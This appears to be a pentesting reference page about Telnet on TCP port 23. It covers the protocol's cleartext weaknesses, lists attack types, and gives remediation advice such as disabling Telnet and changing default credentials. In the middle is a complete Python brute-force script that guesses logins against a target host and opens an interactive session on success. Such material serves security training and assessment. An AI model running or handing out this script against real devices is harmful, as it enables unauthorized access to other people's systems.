## Overview

::card
---
icon: i-lucide-info
title: What is Port 23?
---
**Telnet** (Telecommunication Network) is a legacy remote-access protocol operating on **TCP port 23**. It provides a bidirectional, text-based communication channel — transmitting **everything in cleartext**, including credentials. Despite being largely replaced by SSH, Telnet remains widespread on routers, switches, IoT devices, printers, and legacy industrial systems.
::

::callout
---
icon: i-lucide-skull
color: red
---
Telnet sends **all data — usernames, passwords, commands** — in **plaintext**. Any attacker on the same network segment can sniff credentials with zero effort.
::

## Weakness Analysis

### Core Vulnerabilities

::card-group
  ::card
  ---
  icon: i-lucide-eye-off
  title: "1. Cleartext Transmission"
  color: red
  ---
  All data including **credentials, commands, and output** traverse the network in **plaintext**. Any MITM position allows complete session hijacking.
  ::

  ::card
  ---
  icon: i-lucide-key
  title: "2. No Strong Authentication"
  color: red
  ---
  Telnet relies on **simple username/password** authentication. No support for public-key auth, certificates, MFA, or Kerberos (natively).
  ::

  ::card
  ---
  icon: i-lucide-shield-off
  title: "3. No Integrity Checking"
  color: red
  ---
  No message authentication codes (MAC). An attacker can **inject or modify commands** in transit without detection.
  ::

  ::card
  ---
  icon: i-lucide-lock-open
  title: "4. No Encryption"
  color: red
  ---
  Unlike SSH, Telnet has **zero encryption**. Even the optional `TELNET-ENCRYPT` (RFC 2946) is rarely implemented and cryptographically weak.
  ::

  ::card
  ---
  icon: i-lucide-bug
  title: "5. Session Hijacking"
  color: red
  ---
  Telnet sessions can be **hijacked mid-stream** via ARP spoofing, TCP sequence prediction, or network tap — giving full control to the attacker.
  ::

  ::card
  ---
  icon: i-lucide-bot
  title: "6. IoT Botnet Target"
  color: red
  ---
  Mirai and its variants systematically scan for open Telnet on port 23, brute-force defaults, and **enslave devices** into DDoS botnets.
  ::
::

### Attack Surface Mapping

::field-group
  ::field{name="Credential Sniffing" type="Critical"}
  Passive capture of plaintext credentials using `tcpdump`, `Wireshark`, or `ettercap`. **Zero skill required**.
  ::

  ::field{name="Brute Force" type="High"}
  No rate-limiting or account lockout on most Telnet implementations. Hydra/Medusa can test thousands of combinations per minute.
  ::

  ::field{name="Man-in-the-Middle" type="Critical"}
  ARP spoofing + traffic interception = full credential theft and session manipulation in real-time.
  ::

  ::field{name="Session Hijacking" type="High"}
  TCP session hijack with tools like `hunt`, `shijack`, or manual Scapy scripts. Take over authenticated sessions.
  ::

  ::field{name="Buffer Overflow" type="High"}
  Many Telnet daemon implementations (especially on embedded devices) have **unpatched buffer overflow** vulnerabilities.
  ::

  ::field{name="Default Credentials" type="Critical"}
  Factory-default username/password combinations remain unchanged on millions of internet-facing devices.
  ::

  ::field{name="Command Injection" type="High"}
  Some Telnet services pass user input directly to shell. **Escape sequences and special characters** can break out of restricted shells.
  ::

  ::field{name="DoS / Resource Exhaustion" type="Medium"}
  Flood port 23 with connections to exhaust file descriptors or memory on resource-constrained devices.
  ::
::

  #!/usr/bin/env python3
  """Telnet Brute Force Tool"""
  import telnetlib
  import sys
  from concurrent.futures import ThreadPoolExecutor

  def try_login(host, port, username, password):
      try:
          tn = telnetlib.Telnet(host, port, timeout=5)
          tn.read_until(b"login: ", timeout=3)
          tn.write(username.encode() + b"\n")
          tn.read_until(b"Password: ", timeout=3)
          tn.write(password.encode() + b"\n")
          
          result = tn.read_some().decode('ascii', errors='ignore')
          
          if "incorrect" not in result.lower() and \
             "failed" not in result.lower() and \
             "denied" not in result.lower():
              print(f"[+] SUCCESS: {username}:{password}")
              tn.interact()
              return True
          tn.close()
      except Exception as e:
          pass
      return False

  def main():
      host = sys.argv[1]
      with open("users.txt") as uf, open("passwords.txt") as pf:
          users = [u.strip() for u in uf.readlines()]
          passwords = [p.strip() for p in pf.readlines()]
      
      with ThreadPoolExecutor(max_workers=10) as executor:
          for user in users:
              for pwd in passwords:
                  executor.submit(try_login, host, 23, user, pwd)

  if __name__ == "__main__":
      main()

## Defense & Remediation

::tip
If you're conducting a pentest and need to provide **remediation advice**, include these recommendations.
::

::card-group
  ::card
  ---
  icon: i-lucide-shield-check
  title: "Disable Telnet"
  color: green
  ---
  Replace with **SSH** everywhere. On Cisco: `no service telnet` and `transport input ssh` on VTY lines.
  ::

  ::card
  ---
  icon: i-lucide-lock
  title: "Network Segmentation"
  color: green
  ---
  If Telnet cannot be removed, isolate it behind **VLANs, ACLs, and firewalls**. Never expose port 23 to the internet.
  ::

  ::card
  ---
  icon: i-lucide-key-round
  title: "Change Default Credentials"
  color: green
  ---
  Immediately change **all default passwords**. Implement **strong, unique** credentials on every device.
  ::

  ::card
  ---
  icon: i-lucide-scan-eye
  title: "Monitor & Alert"
  color: green
  ---
  IDS/IPS rules for Telnet traffic. Alert on any port 23 connections. **SIEM correlation** for brute-force patterns.
  ::
